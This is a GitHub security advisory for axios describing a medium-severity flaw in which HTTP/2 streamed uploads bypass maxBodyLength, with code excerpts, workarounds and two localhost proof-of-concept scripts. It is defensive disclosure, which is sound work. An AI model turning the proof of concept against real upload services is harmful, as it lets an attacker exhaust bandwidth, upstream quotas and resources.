# [M] Axios: HTTP/2 streamed uploads bypass `maxBodyLength`

## Summary
Severity: Medium
Advisory: GHSA-mwf2-3pr3-8698
CVE: CVE-2026-67318
CWE: CWE-400
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:L (CVSS_V4)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-mwf2-3pr3-8698
Type: github-advisory

## Affected
- npm: `axios` — affected >=1.13.0 <1.18.0

## Details
## Summary

Axios versions with Node.js HTTP/2 support allow streamed request bodies to bypass `maxBodyLength` enforcement when requests are sent with `httpVersion: 2`.

This affects applications that rely on `maxBodyLength` as a hard cap while forwarding attacker-controlled streams, such as upload endpoints proxying user data to an upstream HTTP/2 service. Buffered request bodies are still checked before the request is sent.

## Impact

An attacker who can control a stream passed to axios can cause the application to transmit more outbound data than the configured `maxBodyLength` limit.

Practical impact is limited to resource consumption and policy bypass: excess outbound bandwidth, egress cost, upstream quota consumption, and limited availability impact on the application or upstream peer. This does not provide code execution, credential disclosure, or request destination control.

Browser adapters are not affected. Axios calls using the default unlimited `maxBodyLength: -1` do not cross this specific configured-limit boundary.

## Affected Functionality

Affected calls require all of the following:

- Node.js HTTP adapter.
- `httpVersion: 2`.
- Request `data` supplied as a stream.
- A finite `maxBodyLength`.
- Attacker-controlled or attacker-influenced stream contents.

Unaffected or differently affected paths:

- String, Buffer, and ArrayBuffer request bodies are checked before transport selection.
- Browser XHR/fetch adapters are not affected.
- HTTP/1.1 requests using `follow-redirects` enforce `options.maxBodyLength`.
- In `axios >=1.15.1`, setting `maxRedirects: 0` on affected HTTP/2 upload calls activates axios’ existing stream wrapper and rejects oversized streams.

## Technical Details

In `lib/adapters/http.js`, axios selects `http2Transport` whenever `httpVersion` resolves to `2`. The adapter still stores `config.maxBodyLength` on `options.maxBodyLength`, but Node’s HTTP/2 request API does not enforce that option.

The stream-level byte-counting wrapper is currently gated on `config.maxBodyLength > -1 && config.maxRedirects === 0`. For HTTP/2 requests using the default redirect setting, axios does not use `follow-redirects` and also does not enter this wrapper, so `uploadStream.pipe(req)` sends the full stream.

Local verification against the current `v1.x` checkout showed a request with `maxBodyLength: 1024` successfully transmitting `2097152` bytes over HTTP/2.

No fixed release exists yet. The fix should enforce the byte-counting stream wrapper for HTTP/2 streamed uploads, not only for the native HTTP/1.1 `maxRedirects: 0` path.

## Proof of Concept of Attack

```js
import http2 from 'node:http2';
import {Readable} from 'node:stream';
import axios from './index.js';

const LIMIT = 1024;
const PAYLOAD_BYTES = 2 * 1024 * 1024;

const server = http2.createServer();

server.on('stream', (stream) => {
  let received = 0;

  stream.on('data', (chunk) => {
    received += chunk.length;
  });

  stream.on('end', () => {
    stream.respond({':status': 200, 'content-type': 'application/json'});
    stream.end(JSON.stringify({received, limit: LIMIT}));
  });
});

await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));

function makeBody(total) {
  const chunk = Buffer.alloc(64 * 1024, 0x41);
  let remaining = total;

  return new Readable({
    read() {
      if (remaining <= 0) {
        this.push(null);
        return;
      }

      const next = remaining >= chunk.length ? chunk : chunk.subarray(0, remaining);
      remaining -= next.length;
      this.push(next);
    }
  });
}

try {
  const response = await axios.post(
    `http://127.0.0.1:${server.address().port}/upload`,
    makeBody(PAYLOAD_BYTES),
    {
      httpVersion: 2,
      maxBodyLength: LIMIT,
      headers: {'content-type': 'application/octet-stream'}
    }
  );

  console.log(response.data);
  // Vulnerable result: { received: 2097152, limit: 1024 }
} finally {
  server.close();
}
```

## Workarounds

For `axios >=1.15.1`, set `maxRedirects: 0` on affected HTTP/2 streamed upload calls. HTTP/2 redirects are not currently supported by the axios HTTP/2 adapter, so this is a practical per-call mitigation for this path.

For earlier affected versions, pre-limit the stream with a byte-counting transform before passing it to axios, reject oversized uploads before forwarding them, or avoid `httpVersion: 2` for untrusted streamed uploads.### Summary
On Node.js, axios's maxBodyLength is documented as a hard cap on outbound request bodies. For streamed uploads sent over httpVersion: 2, axios never enforces this cap: the entire body is transmitted regardless of size. Severity: medium.

<details>
<summary>Original Report</summary>
### Details
In lib/adapters/http.js, transport selection is unconditional for HTTP/2:

http.js Lines 937-956
```
      if (isHttp2) {
        transport = http2Transport;
      } else {
        const configTransport = own('transport');
        if (configTransport) {
          transport = configTransport;
        } else if (config.maxRedirects === 0) {
          transport = isHttpsRequest ? https : http;
          isNativeTransport = true;
        } else {
          if (config.maxRedirects) {
            options.maxRedirects = config.maxRedirects;
          }
          const configBeforeRedirect = own('beforeRedirect');
          if (configBeforeRedirect) {
            options.beforeRedirects.config = configBeforeRedirect;
          }
          transport = isHttpsRequest ? httpsFollow : httpFollow;
        }
      }
```

maxBodyLength is then stored on the request options:

http.js Lines 958-963
```
      if (config.maxBodyLength > -1) {
        options.maxBodyLength = config.maxBodyLength;
      } else {
        // follow-redirects does not skip comparison, so it should always succeed for axios -1 unlimited
        options.maxBodyLength = Infinity;
      }
```
…but options.maxBodyLength is only honored by the follow-redirects transport. Node's native http2.request does not read it. The only stream-level cap in this file is the byte-counting Transform wrapper for streamed uploads, which is gated on config.maxRedirects === 0:

http.js Lines 1270-1304
```
        // Enforce maxBodyLength for streamed uploads on the native http/https
        // transport (maxRedirects === 0); follow-redirects enforces it on the
        // other path.
        let uploadStream = data;
        if (config.maxBodyLength > -1 && config.maxRedirects === 0) {
          const limit = config.maxBodyLength;
          let bytesSent = 0;
          uploadStream = stream.pipeline(
            [
              data,
              new stream.Transform({
                transform(chunk, _enc, cb) {
                  bytesSent += chunk.length;
                  if (bytesSent > limit) {
                    return cb(
                      new AxiosError(
                        'Request body larger than maxBodyLength limit',
                        AxiosError.ERR_BAD_REQUEST,
                        config,
                        req
                      )
                    );
                  }
                  cb(null, chunk);
                },
              }),
            ],
            utils.noop
          );
          uploadStream.on('error', (err) => {
            if (!req.destroyed) req.destroy(err);
          });
        }
        uploadStream.pipe(req);
```

For the HTTP/2 path, neither branch fires: the http2Transport is always selected, and follow-redirects is never used. The byte-counting transform also doesn't fire unless the caller happens to pin maxRedirects: 0. As a result, uploadStream.pipe(req) streams the full body into the HTTP/2 request unbounded.

### PoC
```
import http2 from 'node:http2';
import { Readable } from 'node:stream';
import axios from '../../index.js';

const LIMIT = 1024;
const PAYLOAD_BYTES = 2 * 1024 * 1024;

// Cleartext HTTP/2 (h2c) server. http2.connect() supports h2c when given an
// `http://...` authority, which mirrors what axios does when the request URL
// uses `http://` and `httpVersion: 2`.
const server = http2.createServer();

server.on('stream', (stream, _headers) => {
  let received = 0;
  stream.on('data', (chunk) => {
    received += chunk.length;
  });
  stream.on('end', () => {
    stream.respond({
      ':status': 200,
      'content-type': 'application/json',
    });
    stream.end(JSON.stringify({ received, limit: LIMIT }));
  });
  stream.on('error', () => {
    /* swallow client-side aborts */
  });
});

await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
const port = server.address().port;

function makeBodyStream(totalBytes) {
  const CHUNK = Buffer.alloc(64 * 1024, 0x41);
  let remaining = totalBytes;
  return new Readable({
    read() {
      if (remaining <= 0) {
        this.push(null);
        return;
      }
      const next = remaining >= CHUNK.length ? CHUNK : CHUNK.subarray(0, remaining);
      remaining -= next.length;
      this.push(next);
    },
  });
}

try {
  let result;
  try {
    const response = await axios.post(`http://127.0.0.1:${port}/upload`, makeBodyStream(PAYLOAD_BYTES), {
      httpVersion: 2,
      maxBodyLength: LIMIT,
      // We intentionally do NOT set maxRedirects: 0 — that flag activates the
      // existing HTTP/1 byte-counting wrapper. The bug under test is that the
      // HTTP/2 transport path skips that wrapper entirely.
      headers: { 'content-type': 'application/octet-stream' },
      // Omit content-length so the body is streamed without a known length.
    });
    result = { status: response.status, data: response.data };
  } catch (err) {
    result = { error: err && (err.code || err.message) };
  }

  console.log('--- PoC: HTTP/2 maxBodyLength bypass ---');
  console.log('axios result:', JSON.stringify(result));

  const ok =
    result &&
    result.status === 200 &&
    result.data &&
    typeof result.data === 'object' &&
    result.data.received === PAYLOAD_BYTES &&
    result.data.limit === LIMIT;

  if (ok) {
    console.log(
      `VULNERABLE: server received ${result.data.received} bytes despite ` +
        `maxBodyLength=${LIMIT}.`
    );
    process.exitCode = 0;
  } else {
    console.log('NOT VULNERABLE: axios refused or truncated the oversized stream.');
    process.exitCode = 1;
  }
} finally {
  server.close();
  // http2 sessions cached by axios may keep the event loop alive; force exit
  // after the assertion so the script returns instead of idling on TCP keep-alive.
  setImmediate(() => process.exit(process.exitCode || 0));
}
```

### Impact
- Uncontrolled outbound egress: an attacker who controls the upstream stream (e.g. via an upload endpoint that pipes into axios) can force the application to transmit arbitrarily large payloads.
- Bypass of cost/quota guards configured via maxBodyLength against billed upstream services.
- Resource exhaustion against upstream peers, proxies, and the application's own connection / memory budget.
</details>

## References
- https://github.com/axios/axios/security/advisories/GHSA-mwf2-3pr3-8698
- https://nvd.nist.gov/vuln/detail/CVE-2026-67318
- https://nvd.nist.gov/vuln/detail/CVE-2026-68948
- https://github.com/axios/axios/pull/11000
- https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2
- https://github.com/axios/axios
- https://github.com/axios/axios/releases/tag/v1.18.0
